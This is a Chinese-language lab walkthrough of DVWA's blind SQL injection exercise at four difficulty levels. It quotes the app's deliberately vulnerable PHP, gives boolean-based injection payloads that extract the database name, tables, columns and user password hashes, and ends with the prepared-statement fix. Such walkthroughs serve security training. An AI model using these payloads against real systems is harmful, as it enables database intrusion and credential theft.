	**SQL注入**：SQL注入就是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数下入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。


## 1、LOW
**查看源码**
```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '
<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '
<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

通过查看源码可以看到直接将用户输入的id值带入SQL语句中查询，存在返回”User ID exists in the database.“，不存在返回”User ID is MISSING from the database.“。因此在这里我们只能使用盲注。

通过代码可以看到我们需要使用`'`来闭合前面的`'`，用`#`来注释掉后面的内容。

**实战**<br />判断数据库名称长度,
```
输入：1' and length(database())=4#  返回:User ID exists in the database.
输入：1' and length(database())=5#  返回:User ID is MISSING from the database.
```

说明数据库名称长度为4

使用burp爆破出数据库名
```
1' and substr(database(),1,1)='a'#
```
![image-20210414161636813.png](_img/assets/1655880002677-4d82483c-309e-4f3f-a350-d291752aa122.png)

得到库名dvwa<br />![image-20210414161716191.png](_img/assets/1655880008249-ca6ff68a-b358-4eb5-b5d8-b7695a873299.png)

判断数据库dvwa中的表
```
1' and substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1)='a'#
```
![image-20210414162659468.png](_img/assets/1655880014010-9836d01e-2bc6-4b5f-9cbb-c57813d9f9cf.png)

![image-20210414162632646.png](_img/assets/1655880016524-cfb1be30-37e6-4089-b871-9d251e5695b2.png)

得到表gustbook和users

判断users中的字段
```
1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='a'#
```
![image-20210414164244111.png](_img/assets/1655880025865-823e2b90-1c1c-4416-9021-aa8405eed74f.png)

![image-20210414164307257.png](_img/assets/1655880028372-6d2a0ed3-ae1c-4fa5-938a-38cafe16537d.png)

得到users表中的字段：id、login······

判断第一个user，password
```
1' and substr((select concat_ws('-',user,password) from dvwa.users limit 0,1),1,1)='a'#
```
![image-20210414170504825.png](_img/assets/1655880035558-06918812-faa9-4754-8ac3-ea2eb3fa8530.png)

得到账户和MD5<br />![image-20210414170914553.png](_img/assets/1655880041739-77b889c9-1ca8-49b0-9f36-82042f895109.png)

解密得到明文<br />![image-20210414143459141.png](_img/assets/1655880049479-ee8cc0fc-55f5-49f2-9bf7-a2a932074df5.png)


## 2、Medium
**查看源码**
```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '
<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '
<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?>
```

**函数说明**
```
mysqli_real_escape_string（）
定义和用法
mysqli_real_escape_string（）函数转义在SQL语句中使用的字符串中的特殊字符。

语法
mysqli_real_escape_string(connection,escapestring);
connection:必需。规定要使用的 MySQL 连接。
escapestring:必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、'、" 和 Control-Z。
```

在这里使用了mysqli_real_escape_string（）转义一些特殊字符，也就是说我们不能使用像Low中的`'1#`,不过我们可以使用`and`来进行注入，不需要进行过滤。而且可以看到这里是以表单的形式来然我们提交，web页面参数不可控，所以需要使用burp来抓包重放。修改参数id即可。

**实战**(以下步骤与Low级基本相同不进行详细叙述，仅提供payload)

判断数据库名称长度
```
1 and length(database())=4
```

判断数据库名称(需要将字母转换为ascii十六进制)
```
1 and substr((select database()),1,1)=0x61
```

贴出一个小脚本（也不知道python中有没有能够直接转换的函数）
```python
number = input("请输入要转换字符(连续输入不需要空格)：")numbers = list(number)with open('ascii16.txt','w') as asciis16:    for number1 in numbers:        number = hex(ord(number1))        asciis16.write(number + '\n')
```

得到数据库名字dvwa<br />![image-20210415151801837.png](_img/assets/1655880071524-93ac7220-dcd6-4224-821f-b1a269292fab.png)

判断数据库中的表
```
1 and substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 0,1),1,1)=0x61
```

得到表gustbook，users<br />![image-20210415153338386.png](_img/assets/1655880078165-7e5e8499-9e17-402d-89bc-e7bbf6a51187.png)

判断users中的字段
```
1 and substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1)=0x61
```

得到字段id、login······<br />![image-20210415154023783.png](_img/assets/1655880084376-ad799e91-fc85-4fc5-b793-1724b4581aeb.png)

判断字段user，password的第一个值
```
1 and substr((select concat_ws(0x2d,user,password) from dvwa.users limit 0,1),1,1)=0x61
```

得到第一个账号和MD5值<br />![image-20210415160019399.png](_img/assets/1655880102235-ea0fa526-7cc2-4ca3-9e5e-beb2a93c079c.png)

解密得<br />![image-20210414143459141.png](_img/assets/1655880104911-62c4e6cc-1d62-4faf-9110-a9e46a453171.png)



## 3、High
**查看源码**
```php
<?phpif( isset( $_COOKIE[ 'id' ] ) ) {    // Get input    $id = $_COOKIE[ 'id' ];    // Check database    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors    // Get results    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors    if( $num > 0 ) {        // Feedback for end user        echo '
<pre>User ID exists in the database.</pre>';    }    else {        // Might sleep a random amount        if( rand( 0, 5 ) == 3 ) {            sleep( rand( 2, 4 ) );        }        // User wasn't found, so the page wasn't!        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );        // Feedback for end user        echo '
<pre>User ID is MISSING from the database.</pre>';    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?>
```

通过源码可以看到将参数id放入cookie中，用cookie传递参数，而且使用sleep（）函数对时间盲注造成干扰，并且在 SQL查询语句中添加了LIMIT 1

通过查看SQL语句可以得知我们可以使用`'`来闭合前面的`'`，用`#`来注释掉后面的内容，来进行注入。

**实战**<br />以下类容基本与Low级相似，不进行详细叙述。


## 4、Impossible
**查看源码**

```php
<?phpif( isset( $_GET[ 'Submit' ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input    $id = $_GET[ 'id' ];    // Was a number entered?    if(is_numeric( $id )) {        // Check the database        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );        $data->bindParam( ':id', $id, PDO::PARAM_INT );        $data->execute();        // Get results        if( $data->rowCount() == 1 ) {            // Feedback for end user            echo '
<pre>User ID exists in the database.</pre>';        }        else {            // User wasn't found, so the page wasn't!            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );            // Feedback for end user            echo '
<pre>User ID is MISSING from the database.</pre>';        }    }}// Generate Anti-CSRF tokengenerateSessionToken();?>
```

可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。
